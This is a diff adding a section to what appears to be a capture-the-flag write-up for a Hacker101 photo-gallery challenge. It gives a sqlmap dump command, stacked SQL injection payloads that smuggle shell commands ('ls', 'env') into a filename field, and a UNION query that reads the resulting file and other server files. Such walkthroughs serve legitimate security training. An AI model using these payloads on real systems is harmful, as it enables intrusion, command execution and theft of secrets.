@@ -83,3 +83,19 @@ callable = app
 
 Main.py is the main application, hence we can run the same endpoint, but with main.py: `/fetch?id=0+UNION+SELECT+'main.py`.</br>
 At the bottom it will show the flag.
+
+## Solution 3rd flag
+When running a similar query as for the first flag:</br>
+`sqlmap -u https://1d1cc8435c838e970ef456944e8e8b69.ctf.hacker101.com/fetch?id=1 --method=GET --dump -D level5 -T photos -p id --code=200 --ignore-code=500 --skip-waf --thread=2 -o`
+This will create a strange filename for the file with id=3.</br>
+
+The file cannot be read straight from the files directory, but it needs to be moved to the database as filename where id=3:</br>
+`/fetch?id=1;%20update%20photos%20set%20filename=%27*%20||%20ls%20./files%20%3Etemp.txt%20%27%20where%20id=3;%20commit;%20--`
+
+This is the moment it is possible to retrieve the data from the database:</br>
+`/fetch?id=1;%20update%20photos%20set%20filename=%27*%20||%20env%20%3Etemp.txt%27%20where%20id=3;%20commit;%20--`
+
+To read the created temp file with the environment variables:</br>
+`/fetch?id=0+UNION+SELECT+'temp.txt'`
+
+This will show all the flags in this CTF.
